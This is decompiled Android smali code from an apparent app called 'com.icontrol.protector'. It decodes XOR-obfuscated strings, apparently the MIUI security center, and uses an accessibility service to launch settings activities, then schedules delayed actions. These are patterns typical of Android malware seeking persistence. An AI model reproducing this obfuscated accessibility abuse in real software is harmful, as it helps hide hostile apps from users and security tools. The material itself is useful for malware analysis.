.class Lcom/icontrol/protector/m$e;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/m;->n1()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# direct methods
.method constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 7

    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/16 v2, 0x17

    new-array v3, v2, [B

    fill-array-data v3, :array_0

    const/16 v4, 0x8

    new-array v5, v4, [B

    fill-array-data v5, :array_1

    invoke-static {v3, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    const/16 v5, 0x22

    new-array v5, v5, [B

    fill-array-data v5, :array_2

    new-array v6, v4, [B

    fill-array-data v6, :array_3

    invoke-static {v5, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v3, v5}, Landroid/content/Intent;->setClassName(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    :try_start_0
    sget-object v3, Lcom/icontrol/protector/m;->a:Lcom/icontrol/protector/AccessServices;

    invoke-virtual {v3, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    :try_start_1
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    new-array v1, v2, [B

    fill-array-data v1, :array_4

    new-array v2, v4, [B

    fill-array-data v2, :array_5

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    const/16 v2, 0x27

    new-array v2, v2, [B

    fill-array-data v2, :array_6

    new-array v3, v4, [B

    fill-array-data v3, :array_7

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->setClassName(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    sget-object v1, Lcom/icontrol/protector/m;->a:Lcom/icontrol/protector/AccessServices;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :goto_0
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    new-instance v1, Lcom/icontrol/protector/m$e$a;

    invoke-direct {v1, p0}, Lcom/icontrol/protector/m$e$a;-><init>(Lcom/icontrol/protector/m$e;)V

    const-wide/16 v2, 0xc8

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    new-instance v1, Lcom/icontrol/protector/m$e$b;

    invoke-direct {v1, p0}, Lcom/icontrol/protector/m$e$b;-><init>(Lcom/icontrol/protector/m$e;)V

    const-wide/16 v2, 0x1450

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void

    :catch_1
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    return-void

    nop

    :array_0
    .array-data 1
        -0x76t
        0x2at
        -0x60t
        0x35t
        -0x36t
        0xet
        0x12t
        0x45t
        -0x39t
        0x36t
        -0x58t
        0x78t
        -0x2et
        0x15t
        0xet
        0x58t
        -0x70t
        0x26t
        -0x58t
        0x75t
        -0x2dt
        0x2t
        0x15t
    .end array-data

    :array_1
    .array-data 1
        -0x17t
        0x45t
        -0x33t
        0x1bt
        -0x59t
        0x67t
        0x67t
        0x2ct
    .end array-data

    :array_2
    .array-data 1
        -0x49t
        -0x21t
        -0x26t
        -0x16t
        -0x5et
        -0x12t
        0x36t
        -0x61t
        -0x6t
        -0x3dt
        -0x2et
        -0x59t
        -0x46t
        -0xbt
        0x2at
        -0x7et
        -0x53t
        -0x3dt
        -0x2ct
        -0x5bt
        -0x5ft
        -0x57t
        0xet
        -0x69t
        -0x43t
        -0x22t
        -0xat
        -0x59t
        -0x45t
        -0x12t
        0x35t
        -0x61t
        -0x60t
        -0x37t
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x2ct
        -0x50t
        -0x49t
        -0x3ct
        -0x31t
        -0x79t
        0x43t
        -0xat
    .end array-data

    :array_4
    .array-data 1
        -0x54t
        -0x58t
        -0x75t
        -0x1dt
        0x23t
        0x2et
        0x78t
        -0x23t
        -0x1ft
        -0x4ct
        -0x7dt
        -0x52t
        0x3bt
        0x35t
        0x64t
        -0x40t
        -0x4at
        -0x5ct
        -0x7dt
        -0x5dt
        0x3at
        0x22t
        0x7ft
    .end array-data

    :array_5
    .array-data 1
        -0x31t
        -0x39t
        -0x1at
        -0x33t
        0x4et
        0x47t
        0xdt
        -0x4ct
    .end array-data

    :array_6
    .array-data 1
        -0x3t
        -0x63t
        -0x69t
        -0x6at
        -0x47t
        -0x6dt
        0x3at
        0x73t
        -0x50t
        -0x7ft
        -0x61t
        -0x25t
        -0x5ft
        -0x78t
        0x26t
        0x6et
        -0x19t
        -0x7ft
        -0x67t
        -0x27t
        -0x46t
        -0x2ct
        0x2t
        0x7bt
        -0x9t
        -0x64t
        -0x41t
        -0x2at
        -0x60t
        -0x78t
        0x36t
        0x5bt
        -0x3t
        -0x7at
        -0x6dt
        -0x32t
        -0x43t
        -0x72t
        0x36t
    .end array-data

    :array_7
    .array-data 1
        -0x62t
        -0xet
        -0x6t
        -0x48t
        -0x2ct
        -0x6t
        0x4ft
        0x1at
    .end array-data
.end method
